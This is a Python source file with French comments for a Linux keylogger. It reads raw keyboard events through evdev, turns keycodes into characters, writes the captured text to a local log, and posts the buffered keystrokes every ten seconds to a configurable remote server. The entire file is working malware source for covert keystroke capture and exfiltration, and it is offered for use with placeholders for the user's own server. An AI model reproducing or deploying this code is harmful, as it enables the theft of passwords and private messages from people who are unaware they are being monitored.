import evdev
import threading
import requests
import time

# ——— Configuration du serveur ———
SERVER_IP = "192.168.1.84"   # Remplace par l'IP de ton serveur
SERVER_PORT = 5589           # Remplace par le port de ton serveur
SEND_INTERVAL = 10           # Envoi toutes les 10 secondes

# ——— Fichier du clavier (vérifié avec test_evdev.py) ———
DEVICE_PATH = "/dev/input/event2"

# ——— Fichier local pour stocker les frappes ———
LOCAL_LOG_FILE = "typed_keys.txt"

# ——— Mapping des touches vers des caractères ———
key_map = {
    # Lettres minuscules
    'KEY_A': 'a','KEY_B': 'b','KEY_C': 'c','KEY_D': 'd','KEY_E': 'e',
    'KEY_F': 'f','KEY_G': 'g','KEY_H': 'h','KEY_I': 'i','KEY_J': 'j',
    'KEY_K': 'k','KEY_L': 'l','KEY_M': 'm','KEY_N': 'n','KEY_O': 'o',
    'KEY_P': 'p','KEY_Q': 'q','KEY_R': 'r','KEY_S': 's','KEY_T': 't',
    'KEY_U': 'u','KEY_V': 'v','KEY_W': 'w','KEY_X': 'x','KEY_Y': 'y',
    'KEY_Z': 'z',

    # Chiffres (sans Shift)
    'KEY_1': '1','KEY_2': '2','KEY_3': '3','KEY_4': '4','KEY_5': '5',
    'KEY_6': '6','KEY_7': '7','KEY_8': '8','KEY_9': '9','KEY_0': '0',

    # Caractères spéciaux
    'KEY_SPACE': ' ',
    'KEY_ENTER': '\n',
    'KEY_BACKSPACE': '<BACKSPACE>',

    # Quelques ponctuations
    'KEY_DOT': '.','KEY_COMMA': ',','KEY_SLASH': '/',
    'KEY_SEMICOLON': ';','KEY_MINUS': '-','KEY_EQUAL': '=',
    'KEY_LEFTBRACE': '[','KEY_RIGHTBRACE': ']','KEY_APOSTROPHE': '\'',
    'KEY_BACKSLASH': '\\','KEY_COLON': ':'
}

# ——— Buffer en mémoire pour stocker les caractères avant envoi ———
key_buffer = []
buffer_lock = threading.Lock()

# ——————————————————————————————————————————————————————————————————
# Fonction d’envoi et de sauvegarde : enregistre le texte + envoie au serveur
# ——————————————————————————————————————————————————————————————————
def send_data():
    global key_buffer

    with buffer_lock:
        if key_buffer:
            typed_text = "".join(key_buffer)

            # 1) Écrire dans le fichier local tel quel
            try:
                with open(LOCAL_LOG_FILE, "a") as f:
                    f.write(typed_text)
                # Optionnel : ajouter un "\n" si tu veux séparer les lots
            except Exception as e:
                print(f"[!] Erreur d’écriture locale : {e}")

            # 2) Envoyer au serveur en brut (pas de JSON, juste le texte)
            try:
                response = requests.post(
                    f"http://{SERVER_IP}:{SERVER_PORT}",
                    data=typed_text,  # <-- envoi brut
                    timeout=5
                )
                print(f"[DEBUG] Envoi au serveur : {response.status_code}, {response.text}")
            except requests.exceptions.RequestException as err:
                print(f"[!] Échec d’envoi : {err}")

            # 3) On vide le buffer après envoi
            key_buffer.clear()

    # Reprogrammer l’envoi dans SEND_INTERVAL secondes
    threading.Timer(SEND_INTERVAL, send_data).start()

# ——————————————————————————————————————————————————————————————————
# Fonction de capture : lit les événements clavier et met le texte dans key_buffer
# ——————————————————————————————————————————————————————————————————
def capture_keys():
    try:
        device = evdev.InputDevice(DEVICE_PATH)
        print(f"[DEBUG] Clavier détecté : {device.name} ({DEVICE_PATH})")
    except Exception as e:
        print(f"[!] Erreur accès clavier : {e}")
        return

    print("[DEBUG] Lecture des frappes…")

    # Boucle principale de lecture
    for event in device.read_loop():
        if event.type == evdev.ecodes.EV_KEY and event.value == 1:
            code = evdev.categorize(event).keycode
            mapped_char = key_map.get(code, '')  # Renvoie '' si touche inconnue

            with buffer_lock:
                if mapped_char == '<BACKSPACE>':
                    # Supprimer le dernier caractère si possible
                    if key_buffer:
                        key_buffer.pop()
                else:
                    key_buffer.append(mapped_char)

# ——— Lancement du timer d’envoi ———
threading.Thread(target=send_data, daemon=True).start()

# ——— Lancement de la capture des frappes ———
capture_keys()
